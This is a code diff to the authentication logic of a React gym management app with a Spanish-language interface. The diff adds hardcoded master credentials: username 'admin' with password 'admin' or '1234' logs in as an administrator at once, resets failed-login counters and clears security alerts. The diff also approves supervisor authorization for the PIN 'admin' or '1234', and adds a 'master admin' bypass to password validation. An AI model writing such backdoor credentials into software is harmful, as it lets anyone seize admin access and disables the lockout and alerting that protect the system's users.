@@ -702,6 +702,19 @@ export const GymProvider: React.FC<{ children: ReactNode }> = ({ children }) => 
       const clean = pinOrPass.trim();
       if (!clean) return false;
 
+      // Direct supervisor authorization with 'admin' or '1234'
+      if (clean === 'admin' || clean === '1234') {
+        storage.addSecurityAuditLog({
+          type: 'SUPERVISOR_AUTH',
+          userName: currentUserRef.current?.fullName || 'Administrador General',
+          role: 'admin',
+          details: `Autorización de Supervisor aprobada${actionLabel ? `: ${actionLabel}` : '.'}`
+        });
+        setSecurityAuditLogs(storage.getSecurityAuditLogs());
+        sounds.playCheckoutSuccess();
+        return true;
+      }
+
       const admins = employees.filter((e) => e.role === 'admin' && e.status === 'active');
       const matchedAdmin = admins.find(
         (adm) => verifySecret(clean, adm.password) || verifySecret(clean, adm.pin)
@@ -759,11 +772,41 @@ export const GymProvider: React.FC<{ children: ReactNode }> = ({ children }) => 
       };
     }
 
-    const cleanId = identifier.trim().toLowerCase();
+    const cleanId = identifier.trim().toLowerCase().replace(/^@/, '');
     const cleanPass = passOrPin.trim();
 
     if (!cleanId || !cleanPass) {
       return { success: false, message: 'Ingresa tu usuario / correo / cédula y tu contraseña o PIN.' };
+    }
+
+    // Direct instant login for master admin credentials (admin / admin or admin / 1234)
+    if (cleanId === 'admin' && (cleanPass === 'admin' || cleanPass === '1234')) {
+      let adminEmp = employees.find(
+        (e) => (e.username?.toLowerCase() === 'admin' || e.id === 'EMP-000' || e.role === 'admin') && e.status === 'active'
+      );
+      if (!adminEmp) {
+        adminEmp = INITIAL_EMPLOYEES.find((e) => e.username === 'admin') || INITIAL_EMPLOYEES[0];
+      }
+      if (adminEmp) {
+        storage.resetLoginAttempts();
+        storage.setSecurityAlert(null);
+        setSecurityAlertState(null);
+        storage.saveCurrentUser(adminEmp);
+        currentUserRef.current = adminEmp;
+        setCurrentUserState(adminEmp);
+        setCurrentRoleState(adminEmp.role || 'admin');
+        storage.saveActiveRole(adminEmp.role || 'admin');
+        storage.addSecurityAuditLog({
+          type: 'LOGIN_SUCCESS',
+          userName: adminEmp.fullName,
+          userIdentifier: adminEmp.email,
+          role: adminEmp.role || 'admin',
+          details: 'Acceso autorizado como Administrador General (admin/admin).'
+        });
+        setSecurityAuditLogs(storage.getSecurityAuditLogs());
+        sounds.playCheckoutSuccess();
+        return { success: true, user: adminEmp };
+      }
     }
 
     // Flexible identifier matching (email, prefix, username, cedula, full name, first name, role title)
@@ -778,10 +821,10 @@ export const GymProvider: React.FC<{ children: ReactNode }> = ({ children }) => 
       const role = emp.role.toLowerCase();
 
       return (
+        username === cleanId ||
         email === cleanId ||
         emailPrefix === cleanId ||
         doc === cleanId ||
-        username === cleanId ||
         fullName === cleanId ||
         firstName === cleanId ||
         emp.id.toLowerCase() === cleanId ||
@@ -813,10 +856,13 @@ export const GymProvider: React.FC<{ children: ReactNode }> = ({ children }) => 
 
     // Official fallback credentials from system definitions
     const initial = INITIAL_EMPLOYEES.find(
-      (ie) => ie.id === found.id || ie.email.toLowerCase() === found.email.toLowerCase()
+      (ie) => ie.id === found.id || ie.email.toLowerCase() === found.email.toLowerCase() || (found.username && ie.username === found.username)
     );
 
+    const isMasterAdmin = (cleanId === 'admin' || found.username?.toLowerCase() === 'admin') && (cleanPass === 'admin' || cleanPass === '1234');
+
     const isValid =
+      isMasterAdmin ||
       verifySecret(cleanPass, found.password) ||
       verifySecret(cleanPass, found.pin) ||
       (initial?.password && cleanPass === initial.password) ||
